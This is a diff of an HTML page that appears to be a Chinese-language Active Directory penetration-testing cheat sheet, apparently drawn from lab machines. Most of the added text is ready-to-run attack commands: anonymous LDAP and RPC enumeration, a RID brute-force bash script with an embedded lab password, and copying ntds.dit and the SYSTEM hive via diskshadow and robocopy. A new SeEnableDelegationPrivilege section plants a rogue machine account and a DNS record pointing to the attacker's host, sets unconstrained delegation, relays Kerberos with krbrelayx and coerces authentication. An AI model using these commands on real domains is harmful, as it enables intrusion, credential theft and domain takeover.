@@ -221,7 +221,7 @@
         <li><a href="#服务票据烘培攻击service-ticket-roasting-or-kerberoasting">服务票据烘培攻击（Service Ticket Roasting or Kerberoasting）</a></li>
         <li><a href="#时钟烘焙攻击timeroasting">时钟烘焙攻击（Timeroasting）</a></li>
         <li><a href="#猎犬提取">猎犬提取</a></li>
-        <li><a href="#ldap查询">ldap查询</a></li>
+        <li><a href="#ldap查询包含匿名ldap">ldap查询(包含匿名ldap)</a></li>
         <li><a href="#linux相关">linux相关</a></li>
       </ul>
     </li>
@@ -409,6 +409,7 @@
       <ul>
         <li><a href="#sebackupprivilege">SeBackupPrivilege</a></li>
         <li><a href="#seimpersonateprivilege">SeImpersonatePrivilege</a></li>
+        <li><a href="#seenabledelegationprivilege">SeEnableDelegationPrivilege</a></li>
       </ul>
     </li>
     <li><a href="#高权限组利用">高权限组利用</a>
@@ -665,7 +666,7 @@
 
 
                 <time class="article-time--reading">
-                    43 minute read
+                    45 minute read
                 </time>
             </div>
         
@@ -713,9 +714,10 @@
 </span></span></code></pre></div><p>powerview</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>Get-DomainSid
 </span></span></code></pre></div><h3 id="ftp匿名连接">ftp匿名连接
-</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>ftp &lt;ip&gt;
+</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>ftp $ip
 </span></span><span style="display:flex;"><span>使用账号密码anonymous
-</span></span></code></pre></div><h3 id="nfs相关">NFS相关
+</span></span></code></pre></div><p>如果需要文件get，切换binary防止文件损毁</p>
+<h3 id="nfs相关">NFS相关
 </h3><p>查找匿名共享</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>showmount -e $ip
 </span></span></code></pre></div><h3 id="查询smb共享">查询smb共享
@@ -814,18 +816,22 @@
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>rusthound -d $domain -u $user1@$domain -p $pass1 -f $FQDN -i $ip --fqdn-resolver --adcs -z -o ./ --ldapport <span style="color:#ae81ff">636</span>
 </span></span></code></pre></div><h4 id="bloodhound-python">bloodhound-python
 </h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>bloodhound-python -d $domain -c ALL -u $user -p $pass -ns $ip --zip
-</span></span></code></pre></div><h3 id="ldap查询">ldap查询
+</span></span></code></pre></div><h3 id="ldap查询包含匿名ldap">ldap查询(包含匿名ldap)
 </h3><h4 id="ldapdomaindump抓取所有ldap信息生成可视化图表">ldapdomaindump抓取所有ldap信息生成可视化图表
 </h4><p>用户凭证</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>ldapdomaindump -u $domain<span style="color:#ae81ff">\\</span>$user -p $pass $ip -o ldap/
-</span></span></code></pre></div><h4 id="ldapsearch">ldapsearch
-</h4><p>匿名获取信息</p>
+</span></span></code></pre></div><h4 id="匿名枚举ldap信息">匿名枚举ldap信息
+</h4><p>ldapsearch</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>获取域根目录
 </span></span><span style="display:flex;"><span>ldapsearch -H ldap://$ip -x -s base namingcontexts
 </span></span><span style="display:flex;"><span>获取域全部信息
-</span></span><span style="display:flex;"><span>ldapsearch -H ldap://$ip -x -b <span style="color:#e6db74">&#34;DC=cascade,DC=local&#34;</span> &gt; ldap-anonymous
+</span></span><span style="display:flex;"><span>ldapsearch -H ldap://$ip -x -b <span style="color:#e6db74">&#34;DC=</span>$domain<span style="color:#e6db74">,DC=com&#34;</span> &gt; ldap-anonymous
 </span></span><span style="display:flex;"><span>单独获取域用户信息
-</span></span><span style="display:flex;"><span>ldapsearch -H ldap://$ip -x -b <span style="color:#e6db74">&#34;DC=cascade,DC=local&#34;</span> <span style="color:#e6db74">&#39;(objectClass=person)&#39;</span> &gt; ldap-people
+</span></span><span style="display:flex;"><span>ldapsearch -H ldap://$ip -x -b <span style="color:#e6db74">&#34;DC=</span>$domain<span style="color:#e6db74">,DC=com&#34;</span> <span style="color:#e6db74">&#39;(objectClass=person)&#39;</span> &gt; ldap-people
+</span></span></code></pre></div><p>nxc</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>如果有匿名权限可以直接访问用户信息，注意这个参数查询不全，建议使用ldapsearch抓取所有信息之后截取dn信息
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>nxc ldap $ip -u <span style="color:#e6db74">&#34;&#34;</span> -p <span style="color:#e6db74">&#34;&#34;</span> --users
 </span></span></code></pre></div><h3 id="linux相关">linux相关
 </h3><h2 id="落地保护枚举">落地保护枚举
 </h2><h3 id="查主机信息av">查主机信息（av）
@@ -923,7 +929,9 @@
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc ldap 192.168.117.70 -u Offsec -p lab --find-delegation
 </span></span><span style="display:flex;"><span>nxc ldap 192.168.146.130 -u WEB01$ -H <span style="color:#e6db74">&#34;2a737d391120eb331dbe3d39573f0fdb&#34;</span> --find-delegation
 </span></span></code></pre></div><h3 id="基于资源委派rbcd">基于资源委派(RBCD)
-</h3><p>条件：对任意机器账户具有写入权限
+</h3><p>查找创建机器权限</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc ldap $ip -u $user -p $pass -M maq
+</span></span></code></pre></div><p>条件：对任意机器账户具有写入权限
 powerview</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights <span style="color:#f92672">-like</span> <span style="color:#e6db74">&#39;*GenericWrite*&#39;</span> }
 </span></span></code></pre></div><h3 id="域相关">域相关
@@ -982,23 +990,77 @@ nxc</p>
 </h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>kerbrute userenum --dc $ip -d $domain /opt/user.txt
 </span></span><span style="display:flex;"><span>-v:详细输出
 </span></span><span style="display:flex;"><span>-t:指定线程最高10
-</span></span></code></pre></div><h4 id="nxc_rid爆破需要smb凭证匿名也可">nxc_rid爆破（需要smb凭证，匿名也可）
-</h4><p>默认4000循环</p>
+</span></span></code></pre></div><h4 id="rid爆破枚举">rid爆破枚举
+</h4><h5 id="smb相关rid爆破">smb相关rid爆破
+</h5><p>nxc_rid爆破（需要smb凭证，匿名也可）
+默认4000循环</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc smb $ip -u guest -p <span style="color:#e6db74">&#39;&#39;</span> --rid-brute
 </span></span></code></pre></div><p>可提升</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc smb $ip -u guest -p <span style="color:#e6db74">&#39;&#39;</span> --rid-brute <span style="color:#ae81ff">10000</span>
-</span></span></code></pre></div><h4 id="nxc枚举用户需要凭证">nxc枚举用户（需要凭证）
-</h4><p>有凭证</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc ldap $ip -u $user -p $pass --users
-</span></span></code></pre></div><p>如果以上nxc普通域用户无法枚举则是权限不够，可以通过创建机器用户并用机器用户枚举成功</p>
+</span></span></code></pre></div><p>也可以使用impacket包</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-lookupsid -no-pass guest@$FQDN <span style="color:#ae81ff">20000</span>
+</span></span></code></pre></div><h5 id="mssql相关ris爆破">mssql相关ris爆破
+</h5><p>如果只有mssql权限的话，可以使用下面的脚本跑</p>
+<p>先查询域名和管理员的sid</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>SQLGuest  guest@master<span style="color:#f92672">)</span>&gt; <span style="color:#66d9ef">select</span> default_domain<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>             
+</span></span><span style="display:flex;"><span>----------   
+</span></span><span style="display:flex;"><span>REDELEGATE   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>SQLGuest  guest@master<span style="color:#f92672">)</span>&gt; <span style="color:#66d9ef">select</span> sys.fn_varbintohexstr<span style="color:#f92672">(</span>SUSER_SID<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;REDELEGATE\Administrator&#39;</span><span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>                                                             
+</span></span><span style="display:flex;"><span>----------------------------------------------------------   
+</span></span><span style="display:flex;"><span>0x010500000000000515000000a185deefb22433798d8e847af4010000   
+</span></span></code></pre></div><p>将获取到的sid基准填入下方并且更改下面的连接信息</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>check_rid<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    SID_BASE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;010500000000000515000000a185deefb22433798d8e847a&#34;</span>
+</span></span><span style="display:flex;"><span>    local RID<span style="color:#f92672">=</span>$1
+</span></span><span style="display:flex;"><span>    local HEX_RID<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>python -c <span style="color:#e6db74">&#34;import struct; print(struct.pack(&#39;&lt;I&#39;, </span><span style="color:#e6db74">${</span>RID<span style="color:#e6db74">}</span><span style="color:#e6db74">).hex())&#34;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>    local SID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>SID_BASE<span style="color:#e6db74">}${</span>HEX_RID<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    local RES<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>impacket-mssqlclient SQLGuest:zDPBpaF4FywlqIv11vii@10.129.234.50 -file &lt;<span style="color:#f92672">(</span> echo <span style="color:#e6db74">&#34;select SUSER_SNAME(0x</span><span style="color:#e6db74">${</span>SID<span style="color:#e6db74">}</span><span style="color:#e6db74">);&#34;</span><span style="color:#66d9ef">)</span> 2&gt;&amp;<span style="color:#ae81ff">1</span> | sed -n <span style="color:#e6db74">&#39;/^----/{n;p;}&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>echo <span style="color:#e6db74">&#34;</span>$RES<span style="color:#e6db74">&#34;</span> | xargs<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> !<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;NULL&#34;</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span> echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>RID<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">${</span>RES<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>也可以使用msf</p>
+<p>开启msf后直接使用下面的模块</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>wackymaker@kali$ msfconsole
+</span></span><span style="display:flex;"><span>...<span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>...
+</span></span><span style="display:flex;"><span>msf6 &gt; use auxiliary/admin/mssql/mssql_enum_domain_accounts
+</span></span><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>admin/mssql/mssql_enum_domain_accounts<span style="color:#f92672">)</span> &gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 auxiliary<span style="color:#f92672">(</span>admin/mssql/mssql_enum_domain_accounts<span style="color:#f92672">)</span> &gt; options
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>auxiliary/admin/mssql/mssql_enum_domain_accounts<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name                 Current Setting       Required  Description
+</span></span><span style="display:flex;"><span>   ----                 ---------------       --------  -----------
+</span></span><span style="display:flex;"><span>   FuzzNum              <span style="color:#ae81ff">10000</span>                 yes       Number of principal_ids to fuzz.
+</span></span><span style="display:flex;"><span>   PASSWORD             zDPBpaF4FywlqIv11vii  no        The password <span style="color:#66d9ef">for</span> the specified username
+</span></span><span style="display:flex;"><span>   RHOSTS               dc.redelegate.vl      yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, see https://docs.metasploit.com/docs/using-metasploit/bas
+</span></span><span style="display:flex;"><span>                                                        ics/using-metasploit.html
+</span></span><span style="display:flex;"><span>   RPORT                <span style="color:#ae81ff">1433</span>                  yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   USERNAME             SQLGuest              no        The username to authenticate as
+</span></span><span style="display:flex;"><span>   USE_WINDOWS_AUTHENT  false                 yes       Use windows authentication <span style="color:#f92672">(</span>requires DOMAIN option set<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h4 id="ldap查询">ldap查询
+</h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc ldap $ip -u $user -p $pass --users
+</span></span></code></pre></div><p>如果以上nxc普通域用户无法枚举则是权限不够，可以通过创建机器用户并用机器用户枚举成功，注意不排除存在匿名ldap权限</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#75715e">#查询可创建机器用户数量</span>
 </span></span><span style="display:flex;"><span>nxc ldap $ip -u $user -p <span style="color:#e6db74">&#39;$pass&#39;</span> -M maq
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#创建机器用户</span>
 </span></span><span style="display:flex;"><span>addcomputer.py -computer-name wacky$ -computer-pass <span style="color:#e6db74">&#39;wa2ky!wa2ky!&#39;</span> -dc-host $FQDN -dc-ip $ip $domain_without_com/$user:$pass
-</span></span></code></pre></div><p>匿名用户</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-lookupsid -no-pass guest@$FQDN <span style="color:#ae81ff">20000</span>
 </span></span></code></pre></div><h3 id="impacket包lookupsid枚举">impacket包lookupsid枚举
 </h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-lookupsid $user:$pass@$ip
+</span></span></code></pre></div><h4 id="rpc查询">rpc查询
+</h4><p>用户密码连接</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>rpcclient -U <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">%</span>$pass<span style="color:#e6db74">&#34;</span> $ip
+</span></span></code></pre></div><p>匿名连接</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>rpcclient -U <span style="color:#e6db74">&#34;&#34;</span> -N $ip
+</span></span></code></pre></div><p>进入后执行命令</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>enumdomusers 列出用户
+</span></span><span style="display:flex;"><span>queryuser &lt;rid&gt; 列出用户相关信息
+</span></span><span style="display:flex;"><span>querydispinfo 获取所有用户较少信息
 </span></span></code></pre></div><h3 id="ntlm_v2_hash爆破">ntlm_v2_hash爆破
 </h3><p>获取v2 hash举例如下</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>Administrator::WIN-487IMQOIA8E:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
@@ -1024,7 +1086,7 @@ nxc</p>
 <h3 id="kdbx数据爆破">kdbx数据爆破
 </h3><p>john配合hashcat</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>keepass2john keepass.kdbx &gt; keepass.hash
-</span></span><span style="display:flex;"><span>之后
+</span></span><span style="display:flex;"><span>之后将hash文件前面的文件名删除（打开后删除）
 </span></span><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">13400</span> -a <span style="color:#ae81ff">0</span> -w <span style="color:#ae81ff">1</span> keepass.hash dic2.txt --force
 </span></span></code></pre></div><p>keepass4brute</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>keepass4brute.sh recovery.kdbx
@@ -1529,7 +1591,14 @@ nxc</p>
 </h2><p>可以直接利用changepass.py更改，他调用的是rpcsmc接口允许跳过认证</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-changepasswd $domain/$user:<span style="color:#e6db74">&#34;&#34;</span>@$ip -newpass wackMaker1!
 </span></span></code></pre></div><p>提示需要正确密码，如果我们有过期前的密码就填，没有就留空，一样的</p>
-<h2 id="ntlm_thefthash回调窃取_hash钓鱼">ntlm_theft——hash回调窃取_hash钓鱼
+<p>也可以使用smbpass</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/baby<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbpasswd -U $user -r $ip
+</span></span><span style="display:flex;"><span>Old SMB password:
+</span></span><span style="display:flex;"><span>New SMB password:
+</span></span><span style="display:flex;"><span>Retype new SMB password:
+</span></span><span style="display:flex;"><span>Password changed <span style="color:#66d9ef">for</span> user 
+</span></span></code></pre></div><h2 id="ntlm_thefthash回调窃取_hash钓鱼">ntlm_theft——hash回调窃取_hash钓鱼
 </h2><p>当我们处于内网当中的时候，可以利用此工具生成各种文件用来触发smb认证回调来利用responder截获ntlmv2认证，往往需要配合流量转发使用</p>
 <p>工具地址，注意template也需要下载，最好全部打包</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>https://github.com/Greenwolf/ntlm_theft
@@ -2097,7 +2166,7 @@ nxc</p>
 2，使用交互shell交互，所以需要写脚本利用<br>
 先确认是否启动</p>
 <pre tabindex="0"><code class="language-poershell" data-lang="poershell">Get-Service VSS
-</code></pre><p>之后本地制作脚本（可写目录下制作）</p>
+</code></pre><p>之后本地制作脚本（可写目录下制作,注意需要vss可写，所以一般在C:\Users\users\AppData\Local\Temp目录）</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;set context persistent nowriters&#34;</span> | out-file ./diskshadow.txt -encoding ascii
 </span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;add volume c: alias temp&#34;</span> | out-file ./diskshadow.txt -encoding ascii -append
 </span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;create&#34;</span> | out-file ./diskshadow.txt -encoding ascii -append        
@@ -2105,10 +2174,10 @@ nxc</p>
 </span></span></code></pre></div><p>之后利用卷影复制器执行，让 diskshadow.exe 给 C 盘创建一个副本，然后为其分配盘符 Z 并使其可用（使其可作为驱动器访问）</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>diskshadow.exe /s C:\Users\svc-printer\Documents\diskshadow.txt
 </span></span></code></pre></div><p>将创建在z盘的内容提取</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span> robocopy /B Z:\Windows\NTDS . ntds.dit
-</span></span><span style="display:flex;"><span> download ntds.dit
-</span></span><span style="display:flex;"><span> reg save hklm\system C:\SYSTEM
-</span></span><span style="display:flex;"><span> download SYSTEM
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>robocopy /B Z:\Windows\NTDS . ntds.dit
+</span></span><span style="display:flex;"><span>download ntds.dit
+</span></span><span style="display:flex;"><span>reg save hklm\system C:\SYSTEM
+</span></span><span style="display:flex;"><span>download SYSTEM
 </span></span></code></pre></div><p>本地解密</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
 </span></span></code></pre></div><h4 id="nxc远程抓所有信息一般用这个即可">nxc远程抓所有信息(一般用这个即可)
@@ -2203,7 +2272,47 @@ nxc</p>
 </span></span></code></pre></div><p>直接执行</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>.<span style="color:#ae81ff">\E</span>fsPotato.exe <span style="color:#e6db74">&#34;远程载荷或者反弹shell&#34;</span>
 </span></span></code></pre></div><p>弹回来的shell就全开权限了</p>
-<h2 id="高权限组利用">高权限组利用
+<h3 id="seenabledelegationprivilege">SeEnableDelegationPrivilege
+</h3><p>允许我们创建两种在我们掌控机器上的委派类型</p>
+<h4 id="创建无约束委派">创建无约束委派
+</h4><p>要求：允许创建机器用户，允许添加dns记录，必须使用我们创建的机器，不然dns配置无效
+使用工具：krbrelayx BloodyAD Impacket</p>
+<p>首先创建机器用户</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-addcomputer -computer-name FS01 -computer-pass WACKmaker!1 -dc-ip $ip $domain/$user:$pass
+</span></span></code></pre></div><p>添加dns记录</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>uv run --script /opt/krbrelayx/dnstool.py -u $DOMAIN<span style="color:#ae81ff">\&#34;</span>FS01<span style="color:#e6db74">$&#34; -p &#34;</span>WACKmaker!1<span style="color:#e6db74">&#34; --action add --record FS01.</span>$domain<span style="color:#e6db74"> --data </span>$kali_ip<span style="color:#e6db74"> --type A -dns-ip </span>$DC_ip<span style="color:#e6db74"> </span>$DC_FQDN<span style="color:#e6db74">
+</span></span></span></code></pre></div><p>查询dns记录是否配置完毕</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>dig @$DC_ip FS01.$domain +noall +answer
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 看到指定的是我们的kali——ip则正确</span>
+</span></span></code></pre></div><p>使用bloodyad配置无约束委派</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>bloodyAD -d $domain -u $user -p $pass --host $fqdn add uac <span style="color:#e6db74">&#39;FS01$&#39;</span> -f TRUSTED_FOR_DELEGATION
+</span></span></code></pre></div><p>启用krbrelayx来指定中继，注意这里需要我们创建机器用户的hash，可以转一下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>iconv -f ASCII -t UTF-16LE &lt;<span style="color:#f92672">(</span>printf <span style="color:#e6db74">&#34;WACKmaker!1&#34;</span><span style="color:#f92672">)</span> | openssl dgst -md4
+</span></span></code></pre></div><p>启动中继监听</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>uv run /opt/krbrelayx/krbrelayx.py -hashes :$hash_fs01
+</span></span></code></pre></div><p>使用nxc查询强制身份验证的可用模式</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>netexec smb $ip -u $user -p $pass -M coerce_plus 
+</span></span></code></pre></div><p>哪个可用选哪个，这里使用PrinterBug作为触发中继示例</p>
